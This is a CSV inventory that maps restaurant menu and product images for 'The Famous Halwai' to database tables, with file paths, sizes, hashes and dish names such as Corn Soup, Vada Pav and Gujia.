37.jpg,notforgittrack/the-famous-halwai-images/images/37.jpg,77731,f9fbfb31c49091c6c70fa99b1e125f019c03179de5af2fcd7cca98fd83c337f4,a4087dc270dc6b60c644cad1786d3bf7,DB Mapped (Verified),menu_item_tbl,37,Corn Soup,menu_small_img
37.jpg,notforgittrack/the-famous-halwai-images/images/37.jpg,77731,f9fbfb31c49091c6c70fa99b1e125f019c03179de5af2fcd7cca98fd83c337f4,a4087dc270dc6b60c644cad1786d3bf7,DB Mapped (Verified),product_item_tbl,37,Mint Yogurt Chutney,menu_img
370.jpg,notforgittrack/the-famous-halwai-images/images/370.jpg,97180,412be3e6bbb68a0c190016acd9d35a4664f07c3f0d12ae92272ef5d0e635ee18,00a8029f49da6ad5474bdfe6efa9b3ec,DB Mapped (Verified),menu_item_tbl,370,Katla Kalia,menu_img
370.jpg,notforgittrack/the-famous-halwai-images/images/370.jpg,97180,412be3e6bbb68a0c190016acd9d35a4664f07c3f0d12ae92272ef5d0e635ee18,00a8029f49da6ad5474bdfe6efa9b3ec,DB Mapped (Verified),menu_item_tbl,370,Katla Kalia,menu_small_img
371.JPG,notforgittrack/the-famous-halwai-images/images/371.JPG,26338,1df8b80f69316bf90f0608407c0bc1ed475239635667b1904d542ff6c83c4b9a,efbc4cb82621611eb204b5337e15bcc5,DB Mapped (Verified),menu_item_tbl,371,Macher Muri Ghonto,menu_img
371.JPG,notforgittrack/the-famous-halwai-images/images/371.JPG,26338,1df8b80f69316bf90f0608407c0bc1ed475239635667b1904d542ff6c83c4b9a,efbc4cb82621611eb204b5337e15bcc5,DB Mapped (Verified),menu_item_tbl,371,Macher Muri Ghonto,menu_small_img
372.jpeg,notforgittrack/the-famous-halwai-images/images/372.jpeg,11712,55cc0f8fcf5feca07be8747fbd92015d8c18926ac194cb6752bc479174c88501,0dfeb39c6e2ae8e288688110044e1631,DB Mapped (Verified),menu_item_tbl,372,Aloo Posto â€“ For Potato Lovers,menu_img
372.jpeg,notforgittrack/the-famous-halwai-images/images/372.jpeg,11712,55cc0f8fcf5feca07be8747fbd92015d8c18926ac194cb6752bc479174c88501,0dfeb39c6e2ae8e288688110044e1631,DB Mapped (Verified),menu_item_tbl,372,Aloo Posto â€“ For Potato Lovers,menu_small_img
373.jpg,notforgittrack/the-famous-halwai-images/images/373.jpg,87642,240bf21299efdb3313dd7f33671c549b57bb39200253705749c82c975e022cf5,d8c9a6050e2b1d24cee895b690164b23,DB Mapped (Verified),menu_item_tbl,373,Telebhaja,menu_img
373.jpg,notforgittrack/the-famous-halwai-images/images/373.jpg,87642,240bf21299efdb3313dd7f33671c549b57bb39200253705749c82c975e022cf5,d8c9a6050e2b1d24cee895b690164b23,DB Mapped (Verified),menu_item_tbl,373,Telebhaja,menu_small_img
374.jpeg,notforgittrack/the-famous-halwai-images/images/374.jpeg,6127,55b7860f5e1339415cafeb7be97a78c45e032cb4dfe166d08d84f7495a12d063,d9285139707cbeaa9f99ab9f8c8cae2a,DB Mapped (Verified),menu_item_tbl,374,Jhalmuri â€“ Healthy Munchings,menu_img
374.jpeg,notforgittrack/the-famous-halwai-images/images/374.jpeg,6127,55b7860f5e1339415cafeb7be97a78c45e032cb4dfe166d08d84f7495a12d063,d9285139707cbeaa9f99ab9f8c8cae2a,DB Mapped (Verified),menu_item_tbl,374,Jhalmuri â€“ Healthy Munchings,menu_small_img
375.jpg,notforgittrack/the-famous-halwai-images/images/375.jpg,74793,05e7b5f4a090175d0b0ddac497cfc10b41a9fea0ab5f3816a981cf8d8be814bb,3fc104ab3dc31dd487524714ec69ddc0,DB Mapped (Verified),menu_item_tbl,375,Chop â€“ Spicy Cutlets,menu_img
375.jpg,notforgittrack/the-famous-halwai-images/images/375.jpg,74793,05e7b5f4a090175d0b0ddac497cfc10b41a9fea0ab5f3816a981cf8d8be814bb,3fc104ab3dc31dd487524714ec69ddc0,DB Mapped (Verified),menu_item_tbl,375,Chop â€“ Spicy Cutlets,menu_small_img
376.jpg,notforgittrack/the-famous-halwai-images/images/376.jpg,58390,f56733d11f90fea86c33bbca1e08f476a3b83c9203cfce057bea34cad30deffe,32561173444a48d6a3dc1c1641f44a60,DB Mapped (Verified),menu_item_tbl,376,Kathi Rolls,menu_img
376.jpg,notforgittrack/the-famous-halwai-images/images/376.jpg,58390,f56733d11f90fea86c33bbca1e08f476a3b83c9203cfce057bea34cad30deffe,32561173444a48d6a3dc1c1641f44a60,DB Mapped (Verified),menu_item_tbl,376,Kathi Rolls,menu_small_img
377.jpg,notforgittrack/the-famous-halwai-images/images/377.jpg,8970,c7e12919d202e9a16085b17b99b7d3e5bf43b01291c25b27ee08f80613532adb,4e0d9320be0fedb06b28e81362a26550,DB Mapped (Verified),menu_item_tbl,377,Roshogullas â€“ Sweet Tooth Love,menu_img
377.jpg,notforgittrack/the-famous-halwai-images/images/377.jpg,8970,c7e12919d202e9a16085b17b99b7d3e5bf43b01291c25b27ee08f80613532adb,4e0d9320be0fedb06b28e81362a26550,DB Mapped (Verified),menu_item_tbl,377,Roshogullas â€“ Sweet Tooth Love,menu_small_img
378.jpg,notforgittrack/the-famous-halwai-images/images/378.jpg,68962,5329ae76d49987abb4b643612bd4a7e1963d605e898813ca6ff612769e172b82,5d4c5a8e6ec50a629dd97eb1919a0c37,DB Mapped (Verified),menu_item_tbl,378,Sandesh â€“ Sweet Bites,menu_img
378.jpg,notforgittrack/the-famous-halwai-images/images/378.jpg,68962,5329ae76d49987abb4b643612bd4a7e1963d605e898813ca6ff612769e172b82,5d4c5a8e6ec50a629dd97eb1919a0c37,DB Mapped (Verified),menu_item_tbl,378,Sandesh â€“ Sweet Bites,menu_small_img
379.jpg,notforgittrack/the-famous-halwai-images/images/379.jpg,7013,1d4fad69912a3b04354c7edd211a6237510b33c0f7567161a01581542832cc50,0687913e66131c9598de0c7a304be002,DB Mapped (Verified),menu_item_tbl,379,Chom Chom â€“ Sweet Delicious Amalgamation,menu_img
38.jpeg,notforgittrack/the-famous-halwai-images/images/38.jpeg,5178,e1411fcd2c3cdb3edda6edd0903d973bd2ba07b3c55322ba95c9f231389eb560,959fc549253e4970cc5e73ec67cdc5e0,DB Mapped (Verified),menu_item_tbl,38,Baby Corn Soup,menu_img
38.jpeg,notforgittrack/the-famous-halwai-images/images/38.jpeg,5178,e1411fcd2c3cdb3edda6edd0903d973bd2ba07b3c55322ba95c9f231389eb560,959fc549253e4970cc5e73ec67cdc5e0,DB Mapped (Verified),menu_item_tbl,38,Baby Corn Soup,menu_small_img
380.jpg,notforgittrack/the-famous-halwai-images/images/380.jpg,5405,c29095e5ba094c6e89dd61a7581c0aa768cb557009cc8502bb73c896af698ba9,b155b841aa60b82ef48402c439ded196,DB Mapped (Verified),menu_item_tbl,380,Mishti Doi â€“ Dahi,menu_img
381.jpg,notforgittrack/the-famous-halwai-images/images/381.jpg,11370,76b28dfbe39de19314e8966acdc64c3d6cc0fb7ee27bd498d94341b917b5d36d,72b7b58c5a4211792aba32f85312f32a,DB Mapped (Verified),menu_item_tbl,381,Patisapta,menu_img
382.jpg,notforgittrack/the-famous-halwai-images/images/382.jpg,11582,4dacf1663437ef4f06ea56175d95463dad8b15c9223d6607c8cb9c165ce861f8,cc0f6b843cfff3a807f800f65d353a83,DB Mapped (Verified),menu_item_tbl,382,Pav Bhaji,menu_img
383.jpg,notforgittrack/the-famous-halwai-images/images/383.jpg,10141,c452d9da5ddd59f8c6df0bff13bc2686fd4f62cbb36713e348db28c2f552bf92,a6680b04ee840f23b19da4a6a720885c,DB Mapped (Verified),menu_item_tbl,383,Vada Pav,menu_img
384.jpg,notforgittrack/the-famous-halwai-images/images/384.jpg,17731,714b4aca8315ea4c9148fdc7541b1dd9eaaacd7d537697cdd3af4f98fa147abc,740c1095a45d893613029488e59d9fae,DB Mapped (Verified),menu_item_tbl,384,Puran Poli,menu_img
385.jpg,notforgittrack/the-famous-halwai-images/images/385.jpg,16406,79d8c1d008790394ab2eafd5f2164a48ae912d58daac9956d60053d447202c44,88f3fd23495b70d761400ad4ab049732,DB Mapped (Verified),menu_item_tbl,385,Misal Pav,menu_img
386.jpg,notforgittrack/the-famous-halwai-images/images/386.jpg,10733,895079bda1b8e0072f19f11d8fab0d68f8d67c5bc043954764cd1bacebef9215,8330924b5829314983fac08c56bf48c8,DB Mapped (Verified),menu_item_tbl,386,Modak,menu_img
387.jpg,notforgittrack/the-famous-halwai-images/images/387.jpg,11241,d5c45cae0dd098523aaf15270b4d77e8bf161765de171050e9cb3a5b01cf80da,3469b1e154350ffd1c743aa5343690ed,DB Mapped (Verified),menu_item_tbl,387,Ragda Pattice,menu_img
388.jpg,notforgittrack/the-famous-halwai-images/images/388.jpg,10136,dc336a0d9296dbd444bf3578652226c0c3eb0c24e53dc182bd68859a53e92591,44ae13fe24746c556365f302e701822a,DB Mapped (Verified),menu_item_tbl,388,Bharli Vangi,menu_img
389.jpg,notforgittrack/the-famous-halwai-images/images/389.jpg,11647,893abef02614183e4189a3c7f6495d0bf9d5cbe27d5e68ac6c7a5eddabf5e669,fcc21033bcf0e2d0b657ae472c9c95be,DB Mapped (Verified),menu_item_tbl,389,Sreekhand,menu_img
39.jpg,notforgittrack/the-famous-halwai-images/images/39.jpg,37099,726aedbfa693846e8f3fe4f9f99a7338d8471eb7451bd5d1a90d1ce7d44e1d70,2e4531cb12d5ad34549ea81714513076,DB Mapped (Verified),menu_item_tbl,39,Tom Yum Soup,menu_img
39.jpg,notforgittrack/the-famous-halwai-images/images/39.jpg,37099,726aedbfa693846e8f3fe4f9f99a7338d8471eb7451bd5d1a90d1ce7d44e1d70,2e4531cb12d5ad34549ea81714513076,DB Mapped (Verified),menu_item_tbl,39,Tom Yum Soup,menu_small_img
39.jpg,notforgittrack/the-famous-halwai-images/images/39.jpg,37099,726aedbfa693846e8f3fe4f9f99a7338d8471eb7451bd5d1a90d1ce7d44e1d70,2e4531cb12d5ad34549ea81714513076,DB Mapped (Verified),product_item_tbl,39,Capsicum Peanut Chutney,menu_img
390.jpg,notforgittrack/the-famous-halwai-images/images/390.jpg,11047,abb2038195f1620e85e5e883e577a939dc632651007ffe17be3bc5327b8f9975,dd486a6ea47e99cbed38738ff719d63e,DB Mapped (Verified),menu_item_tbl,390,Poha - Maharashtra food classic to breakfast rescue,menu_img
391.jpg,notforgittrack/the-famous-halwai-images/images/391.jpg,11076,bfd292f3f96a0382ee75a6104ce92e9e0809af9541dc20c7a2a9970d14b80dcc,5511e128a8266fbe7988f65adf9649a7,DB Mapped (Verified),menu_item_tbl,391,Sabudana khichdi,menu_img
392.jpg,notforgittrack/the-famous-halwai-images/images/392.jpg,8405,b01bef614c4c0fd1013752ef9b7c8fdb2311d3d0ab2bbe556dc173312d9001bc,ca4b6316a90d67eb733a6d8bbc679de9,DB Mapped (Verified),menu_item_tbl,392,Rassa,menu_img
393.jpg,notforgittrack/the-famous-halwai-images/images/393.jpg,7166,ea45085f81acf34f1a3b4dda9fbb61abaaec3cc8506646343d6764a3291a6446,8133f8db41a79531ed7d9589fa307a98,DB Mapped (Verified),menu_item_tbl,393,Sol Kadhi,menu_img
394.jpg,notforgittrack/the-famous-halwai-images/images/394.jpg,10019,9c81b225f329333b5f987c6eee7bdf9e1a55a39fa7ec7d24d042ec6d7981382d,833efc2ddf009a771d99195ccdba688d,DB Mapped (Verified),menu_item_tbl,394,Pithla Bhakri,menu_img
395.jpg,notforgittrack/the-famous-halwai-images/images/395.jpg,11077,36db065096426a28d1e4594ad5cb73b21b76f597a421c7397cb155f9f458a7f3,1f7905145f973d3425d4537d1fa8e992,DB Mapped (Verified),menu_item_tbl,395,Aamti - Maharashtrian Dal,menu_img
396.jpg,notforgittrack/the-famous-halwai-images/images/396.jpg,13489,9fb779d012794a147b2cd80bfbf71b33fa0088c44551fa9cf7dde29724930983,084a78b85caad1988b4cbb3bad0bcb54,DB Mapped (Verified),menu_item_tbl,396,Bhelpuri,menu_img
397.jpg,notforgittrack/the-famous-halwai-images/images/397.jpg,7474,27c620d35011389a18cb40802db15a0443f1d2fc948373f7ada7c54e7a26f480,1f6b48d47228c47aba8d4984dca6be51,DB Mapped (Verified),menu_item_tbl,397,Basundi,menu_img
398.jpg,notforgittrack/the-famous-halwai-images/images/398.jpg,8291,7dd5c15454a47f74635c3c187fa3363056602220077df25dadac61fa8574a35d,18caa9421eccdd3bfdc4eeeaecf11ff7,DB Mapped (Verified),menu_item_tbl,398,Kairi Cha Panha,menu_img
399.jpg,notforgittrack/the-famous-halwai-images/images/399.jpg,6588,21b6f3ed24b8ee4e777a13eb2502e2a5093dbdd54487868f19042a981bd653a5,6af4e1ab4120ed0cfc3d6c365fb89a52,DB Mapped (Verified),menu_item_tbl,399,Aamrus,menu_img
4.jpg,notforgittrack/the-famous-halwai-images/images/4.jpg,193458,36e7334599431d1a440adaed47f8e42713bb4105f967a0e0931f4b425449995c,fb9d20a439267624a4365abe208d440b,DB Mapped (Verified),menu_item_tbl,4,Sambhar,menu_img
4.jpg,notforgittrack/the-famous-halwai-images/images/4.jpg,193458,36e7334599431d1a440adaed47f8e42713bb4105f967a0e0931f4b425449995c,fb9d20a439267624a4365abe208d440b,DB Mapped (Verified),product_item_tbl,4,Loose Mitthi Matthi,menu_img
4.jpg,notforgittrack/the-famous-halwai-images/images/4.jpg,193458,36e7334599431d1a440adaed47f8e42713bb4105f967a0e0931f4b425449995c,fb9d20a439267624a4365abe208d440b,DB Mapped (Verified),website_gallery,4,Images 4,gimage
4.jpg,notforgittrack/the-famous-halwai-images/images/4.jpg,193458,36e7334599431d1a440adaed47f8e42713bb4105f967a0e0931f4b425449995c,fb9d20a439267624a4365abe208d440b,DB Mapped (Verified),recipe_appliances_kits,4,Spatula,kits_img
4.jpg,notforgittrack/the-famous-halwai-images/images/4.jpg,193458,36e7334599431d1a440adaed47f8e42713bb4105f967a0e0931f4b425449995c,fb9d20a439267624a4365abe208d440b,DB Mapped (Verified),event_cuisine,4,Flame Grilled to Perfection,cuisine_img
40.jpeg,notforgittrack/the-famous-halwai-images/images/40.jpeg,8806,3196785dcb473a3addde3e61e47a4cf4394fd429586d6952a709af83cd13be62,ce7560b62a34391455eba613561903cf,DB Mapped (Verified),menu_item_tbl,40,Kimchi Soup,menu_img
40.jpeg,notforgittrack/the-famous-halwai-images/images/40.jpeg,8806,3196785dcb473a3addde3e61e47a4cf4394fd429586d6952a709af83cd13be62,ce7560b62a34391455eba613561903cf,DB Mapped (Verified),menu_item_tbl,40,Kimchi Soup,menu_small_img
400.jpg,notforgittrack/the-famous-halwai-images/images/400.jpg,9639,c091cdab90d0bb3af8d7c6eba81cb2e375abc970ea900ef714f0e2b5b7f37dc7,659e44c5e7b79146d7295e6c7549ef34,DB Mapped (Verified),menu_item_tbl,400,Kadhi,menu_img
401.jpg,notforgittrack/the-famous-halwai-images/images/401.jpg,9861,deb767d6d8fee49e5021f7dc973b4096052e3eab024be59bdecfb8c787afa203,e5ec0d479f335298a60440e84d46c205,DB Mapped (Verified),menu_item_tbl,401,Bombil/Bombay Duck,menu_img
402.jpg,notforgittrack/the-famous-halwai-images/images/402.jpg,18108,c9cbd2ce7378ac4675d183010276d97263b6f22e60e28dd6a59fa3b7c4afd69f,7a72be12781170ff23b53dd508dc3754,DB Mapped (Verified),menu_item_tbl,402,Butter Chicken,menu_img
403.jpg,notforgittrack/the-famous-halwai-images/images/403.jpg,10146,a5f3a8d108883fca7dd65a245d90e02c861789e4afc0c80b561a767e3bdfa1ad,2246da8905848ace4ed8ec1688868a5e,DB Mapped (Verified),menu_item_tbl,403,Shakkar Para,menu_img
404.jpg,notforgittrack/the-famous-halwai-images/images/404.jpg,6870,caf6c885373a4cf2356de160f9f42253730e2d3090f12f5cd35fbb1248f9c8fe,f8888d46f9602004c5ff8eaa253ffdc7,DB Mapped (Verified),menu_item_tbl,404,Lassi - Curde,menu_img
405.jpg,notforgittrack/the-famous-halwai-images/images/405.jpg,15480,ec285958bf9885318dbf98938e4cfba6a4b642c1b6d1d8fb99971a30112d2d22,24813e67fc54ce95ee4934cdf8c1a5e0,DB Mapped (Verified),menu_item_tbl,405,Chole,menu_img
406.jpg,notforgittrack/the-famous-halwai-images/images/406.jpg,12508,12fd4c670c839f47d3b80816185887fe727fd39eeeb84c8b9be70e0cec09dddf,4de33e6f37d8e9a37e3a157906a59fc5,DB Mapped (Verified),menu_item_tbl,406,Chole-Bhature - Punjabi Food Fiesta,menu_img
407.jpg,notforgittrack/the-famous-halwai-images/images/407.jpg,12038,b16fb83329f546ac0e5c7b70e38b57741939a57c6099b0607b13f0759604aaf7,ed69ac00de57e1f0760496037e4454c2,DB Mapped (Verified),menu_item_tbl,407,Parantha - The Staple Food of Punjab,menu_img
408.jpg,notforgittrack/the-famous-halwai-images/images/408.jpg,13223,65fe6c095c694f1495e6cf2ce0c0f4d97cd392623708cc57f930363e85fb9c71,ac20fe676fabdff415e5b85c49edd552,DB Mapped (Verified),menu_item_tbl,408,Amritsari Fish,menu_img
409.jpg,notforgittrack/the-famous-halwai-images/images/409.jpg,8976,5e7babc9759a5a0039f11446ed5b2d1c73cabedc209a0f2eb24da779a8649b2f,5c325ea2fac4b0ddf301379e0c3b4cb9,DB Mapped (Verified),menu_item_tbl,409,Dal Makhani,menu_img
41.jpg,notforgittrack/the-famous-halwai-images/images/41.jpg,11283,b12e3d6a923bba6ad9e610e3a456151e327b06c368710970c667c84a62703969,55edb66c6842b869e8495b66c72d8df7,DB Mapped (Verified),menu_item_tbl,41,Maxican Soup,menu_img
41.jpg,notforgittrack/the-famous-halwai-images/images/41.jpg,11283,b12e3d6a923bba6ad9e610e3a456151e327b06c368710970c667c84a62703969,55edb66c6842b869e8495b66c72d8df7,DB Mapped (Verified),menu_item_tbl,41,Maxican Soup,menu_small_img
41.jpg,notforgittrack/the-famous-halwai-images/images/41.jpg,11283,b12e3d6a923bba6ad9e610e3a456151e327b06c368710970c667c84a62703969,55edb66c6842b869e8495b66c72d8df7,DB Mapped (Verified),product_item_tbl,41,Zucchini Chutney,menu_img
410.jpg,notforgittrack/the-famous-halwai-images/images/410.jpg,11353,26b06032af8d2807659145e7288fbb462577c83b9e708b6cfd2bd8d0214807dc,eddcb748c33ddad0e757e72163256138,DB Mapped (Verified),menu_item_tbl,410,Paneer Tikka,menu_img
411.jpg,notforgittrack/the-famous-halwai-images/images/411.jpg,16161,9aaecbc954e9792702cff933d3ae4db80de04e18627b836671a2d24c90d53f99,7df81a4f1d717f67ad722c5d9ccf5c91,DB Mapped (Verified),menu_item_tbl,411,Punjabi Pakoda Kadhi,menu_img
412.jpg,notforgittrack/the-famous-halwai-images/images/412.jpg,12958,4c8ba00a5420a880a9f3ac535f9eb2b3e43952b09007fc593748c74f8a78db57,8fef40fa7cbc948a15c7e69a4f8d4696,DB Mapped (Verified),menu_item_tbl,412,Rajma Chawal,menu_img
413.jpg,notforgittrack/the-famous-halwai-images/images/413.jpg,10821,f2a20113c76e48469e47438330008c2629bf1d7205034cf954879e32fa82c65c,3c105ce69023a3563e5044d7afc86f11,DB Mapped (Verified),menu_item_tbl,413,Sarson ka Saag,menu_img
414.jpg,notforgittrack/the-famous-halwai-images/images/414.jpg,14057,ac6faf81503701165e53cfa55e1a9f84f33e5b2791d0e251fc252fccb866008f,8bb0269b92b109b8d362e406ba210380,DB Mapped (Verified),menu_item_tbl,414,Makki ki Roti,menu_img
415.jpg,notforgittrack/the-famous-halwai-images/images/415.jpg,8776,36749c2efd5abc800ac06ab03fe3c0e2bc3a2584f5980e00e674a157e0a15917,d02d81e4c690b3e367cdcafedd70a5f9,DB Mapped (Verified),menu_item_tbl,415,Karma Prashad,menu_img
416.jpg,notforgittrack/the-famous-halwai-images/images/416.jpg,12340,841c330cb2b77edf1e010c52d54837020e37215d4488622268845490e781f0d8,057224c7bf27d817f29094fc97ee88af,DB Mapped (Verified),menu_item_tbl,416,Gobhi-Shalgam-Gajaar Achaar,menu_img
417.jpg,notforgittrack/the-famous-halwai-images/images/417.jpg,9926,30a8221f7b0328d36cdd2a4bc7b69b0f8cbd8eb4dc5c8bf11eb1e186afd570a0,f65aae4d7b8ffce65bb499fbeeeaca24,DB Mapped (Verified),menu_item_tbl,417,"Pinni â€“ Sweet A hot, sweet hug",menu_img
418.jpg,notforgittrack/the-famous-halwai-images/images/418.jpg,13719,44036ff00e4b844e93d03b6574bee8480fa588a5452c29e6fb6a4ef51adc8dab,6db5d252cf0cf586c3e381c3952dacfe,DB Mapped (Verified),menu_item_tbl,418,Dal Bati Churma - Spicy Daal,menu_img
419.jpg,notforgittrack/the-famous-halwai-images/images/419.jpg,16303,bb79b7e2cb618ac71dda406cdad60814e0b4d053d25210ee55ce465a5b3907be,b728cd7e80e6a1474dbdada803a237e5,DB Mapped (Verified),menu_item_tbl,419,Mohan Thaal,menu_img
42.jpg,notforgittrack/the-famous-halwai-images/images/42.jpg,15197,33e4fc6d0bae8d43eff68c4fd4778a3aac53f34acd0ad559d2f7aecea67b2aa1,76ad96f08bd0a53f9882c4deaa6ee3fe,DB Mapped (Verified),menu_item_tbl,42,Tomato Coconut Soup,menu_img
42.jpg,notforgittrack/the-famous-halwai-images/images/42.jpg,15197,33e4fc6d0bae8d43eff68c4fd4778a3aac53f34acd0ad559d2f7aecea67b2aa1,76ad96f08bd0a53f9882c4deaa6ee3fe,DB Mapped (Verified),menu_item_tbl,42,Tomato Coconut Soup,menu_small_img
42.jpg,notforgittrack/the-famous-halwai-images/images/42.jpg,15197,33e4fc6d0bae8d43eff68c4fd4778a3aac53f34acd0ad559d2f7aecea67b2aa1,76ad96f08bd0a53f9882c4deaa6ee3fe,DB Mapped (Verified),product_item_tbl,42,Walnut Chutney,menu_img
420.jpg,notforgittrack/the-famous-halwai-images/images/420.jpg,10472,2a7f89d52e1310fa5b5d472aec6ba9be4734c5140783f606c19f2546b61bc306,c1d190f9b8c14a4a9fec3c3688742bde,DB Mapped (Verified),menu_item_tbl,420,Laal Maas,menu_img
421.jpg,notforgittrack/the-famous-halwai-images/images/421.jpg,9670,a90b117be3e24fb62aed63ce149af2222b28e2f66d8c0d55d96c8eba5acb0188,0925d7cf3fa058450f8a3a075a7a04d6,DB Mapped (Verified),menu_item_tbl,421,Mawa Kachori,menu_img
422.jpg,notforgittrack/the-famous-halwai-images/images/422.jpg,12317,1c0a6a86c9a4c4d208a292cd3b14876ca3e3b68d02ceb848fe761950b4ff6a03,20ed52d69f0eaedd830b469fb86f79ea,DB Mapped (Verified),menu_item_tbl,422,Mirchi Bada,menu_img
423.jpg,notforgittrack/the-famous-halwai-images/images/423.jpg,10064,7608c0dfe23172f250863ad37a8b7f8d0fbc058796cfbf5717629fba64c24340,75007b0ba069ada41c74cbf53a7dcc6b,DB Mapped (Verified),menu_item_tbl,423,Mohan Maas,menu_img
424.jpg,notforgittrack/the-famous-halwai-images/images/424.jpg,9673,c3fe0d4213f21fe5c494bf8c5408fc590afc629a1c6cabc4d396a5e97bf9e0f9,120052a8cad8761615e8061d914302ae,DB Mapped (Verified),menu_item_tbl,424,Kalakand,menu_img
425.jpg,notforgittrack/the-famous-halwai-images/images/425.jpg,8534,6e0cb7e27f69174946727ea79388fafce1cd599d67bc1f287c4012c94a537413,4cb9a430c304466d841e9e929c79484c,DB Mapped (Verified),menu_item_tbl,425,Pyaaz Ki Kachori,menu_img
426.jpg,notforgittrack/the-famous-halwai-images/images/426.jpg,11748,f490012a6b0ff7b52283491be531081cc1c51b768cda18f9dbe8534cd9d4d44e,d814e7ada2350f0b0112cb69cea11edb,DB Mapped (Verified),menu_item_tbl,426,Gatte- Sabzi,menu_img
427.jpg,notforgittrack/the-famous-halwai-images/images/427.jpg,11794,749af11b1f082710f3c13833d937c48fadd197ffb6967a236cdbdfeafbd0d697,85d1724070753e579fae7719d956b8c1,DB Mapped (Verified),menu_item_tbl,427,Kadhi - Sabzi,menu_img
428.jpg,notforgittrack/the-famous-halwai-images/images/428.jpg,8042,522dc951e5fdf5a6d995d5a0a71448e429863785dcfead6c9d7f06e0a53c2c58,5d2b6996211e9c6253f21de231651536,DB Mapped (Verified),menu_item_tbl,428,Jaljeera,menu_img
429.jpg,notforgittrack/the-famous-halwai-images/images/429.jpg,8062,13c8b33782e451c5bb22657fd212c3b5f5f643fe61286183b09f97dbd5613b7b,848ddf4251d8f2527eff5b95f383a984,DB Mapped (Verified),menu_item_tbl,429,Masala-Chhach,menu_img
43.jpg,notforgittrack/the-famous-halwai-images/images/43.jpg,13879,bcf612883e66b50269e1c82ac8942cf5c2e1b4a6ff8b3918df5aa99bc5b07c13,2d5c295f97537d2a0bcbab0b87beda4a,DB Mapped (Verified),menu_item_tbl,43,Palak Paneer Soup,menu_img
43.jpg,notforgittrack/the-famous-halwai-images/images/43.jpg,13879,bcf612883e66b50269e1c82ac8942cf5c2e1b4a6ff8b3918df5aa99bc5b07c13,2d5c295f97537d2a0bcbab0b87beda4a,DB Mapped (Verified),menu_item_tbl,43,Palak Paneer Soup,menu_small_img
43.jpg,notforgittrack/the-famous-halwai-images/images/43.jpg,13879,bcf612883e66b50269e1c82ac8942cf5c2e1b4a6ff8b3918df5aa99bc5b07c13,2d5c295f97537d2a0bcbab0b87beda4a,DB Mapped (Verified),product_item_tbl,43,Mango Chutney,menu_img
430.jpg,notforgittrack/the-famous-halwai-images/images/430.jpg,10311,025bb91d2afe955a27c195b348c8545c5d014b13bd7e5795e25722c7e3b1712c,bbaa9f712bd1d1b36a3ce65cc828bbaf,DB Mapped (Verified),menu_item_tbl,430,Bajra Ki Raab,menu_img
431.jpg,notforgittrack/the-famous-halwai-images/images/431.jpg,10571,2b2c09fa62dafd003d6cc609812b9193be747b36ddb78a3133be54b050560f26,a9a8506ad4f1484bd19cf56cbe369e33,DB Mapped (Verified),menu_item_tbl,431,Ghevar,menu_img
432.jpg,notforgittrack/the-famous-halwai-images/images/432.jpg,10760,57ca7975f9c8092992c0c2ac5718c7881f6f76f9fe0c779d3d5f23407be23726,eee7a9fe4d13bdcaddafd50f008e6a3b,DB Mapped (Verified),menu_item_tbl,432,Moong Ki Daal Ka Halwa,menu_img
433.jpg,notforgittrack/the-famous-halwai-images/images/433.jpg,8575,4f186c6c420e86c1f4086222fe0c53c82cdae54a8ddf6ae81a7a43a2083de2bd,09ad951839060f3d2419524f69238b2e,DB Mapped (Verified),menu_item_tbl,433,Malpua,menu_img
434.jpg,notforgittrack/the-famous-halwai-images/images/434.jpg,10157,a12f367a437b72672da9d563de2b517c648e8590ff314502cfc0b614971e6484,3ea8870a4769c586d6df4c3e587b5032,DB Mapped (Verified),menu_item_tbl,434,"Chutneys like Kachri, Imli, Lehsun and Tamatar",menu_img
435.jpg,notforgittrack/the-famous-halwai-images/images/435.jpg,11078,43f290e1966bae5eef57c10bceca1caf0a5fb4d143557921d0f85899120d3dd7,1778ae508e0ed1c1bb74c2ace5be0aac,DB Mapped (Verified),menu_item_tbl,435,Bajra ki Roti with Lehsun Chutney,menu_img
436.jpg,notforgittrack/the-famous-halwai-images/images/436.jpg,11023,c0f4cbdedc26b719eb350fbdaad685d81eadc482a93f08588f62b1dc7dd1b657,b3531143f42f34311ba19502d76881d9,DB Mapped (Verified),menu_item_tbl,436,Churma Ladoo,menu_img
437.jpg,notforgittrack/the-famous-halwai-images/images/437.jpg,7557,b993bc36926aa2e7f0641f717818b221b8c863378116b0aceddb598ca88084e1,afd10a47409b0df2791fc5ce0d11946a,DB Mapped (Verified),menu_item_tbl,437,Balushahi,menu_img
438.jpg,notforgittrack/the-famous-halwai-images/images/438.jpg,13753,53a3ff8f8880050feda4797a4d5a749b4045d64be69b645a998e0ad3b0e807e8,e7a1fb3ce85ec0a4055b9b99090a59e5,DB Mapped (Verified),menu_item_tbl,438,Ker Sangari Ro Saag,menu_img
439.jpg,notforgittrack/the-famous-halwai-images/images/439.jpg,12655,99315d4b4032cec547246187f9c0e475e05a980320b0e8ba3c182729f403f363,c09e809f804cd0856bc2c86601f25754,DB Mapped (Verified),menu_item_tbl,439,Boondi Raita,menu_img
44.jpeg,notforgittrack/the-famous-halwai-images/images/44.jpeg,7330,6168da405e08a7a704afaa1fc3848886f9e56dbe8482f52e3bb7f945ead833fd,97362fec920143900fbecc507ea52a59,DB Mapped (Verified),menu_item_tbl,44,Broccoli Almond Soup,menu_img
44.jpeg,notforgittrack/the-famous-halwai-images/images/44.jpeg,7330,6168da405e08a7a704afaa1fc3848886f9e56dbe8482f52e3bb7f945ead833fd,97362fec920143900fbecc507ea52a59,DB Mapped (Verified),menu_item_tbl,44,Broccoli Almond Soup,menu_small_img
440.jpg,notforgittrack/the-famous-halwai-images/images/440.jpg,11258,8b4fca890ea989ca35aa742cd75cafff25831c60e09134a07b50fd02eda293d6,834fce28df8a9ee0e29ffd7b2bb2321d,DB Mapped (Verified),menu_item_tbl,440,Badam ka Halwa,menu_img
441.jpg,notforgittrack/the-famous-halwai-images/images/441.jpg,9487,5a1419fae88140f55e2b390c07a2b65560a32c442117ea31ad5e7943345385cf,c44ffbfae1757ff565bd7e9a7fd0c789,DB Mapped (Verified),menu_item_tbl,441,Aam ki Launji â€“ Raw Mango Launji Achar,menu_img
442.jpg,notforgittrack/the-famous-halwai-images/images/442.jpg,9604,301505e7bbd1cbe2ef731732387c7542c7a303947a6deb43b42d004e569d9484,4fd3dae5feb4989e34831ab42e9fa9b0,DB Mapped (Verified),menu_item_tbl,442,Methi Bajra Puri,menu_img
443.jpg,notforgittrack/the-famous-halwai-images/images/443.jpg,10684,d28942e1baf33dddddc49d2d9fbcdccadc0c40533b899d135ee8b23ebfee99b8,c69db494a7dd05f63f211724bf5e2126,DB Mapped (Verified),menu_item_tbl,443,Gujia,menu_img
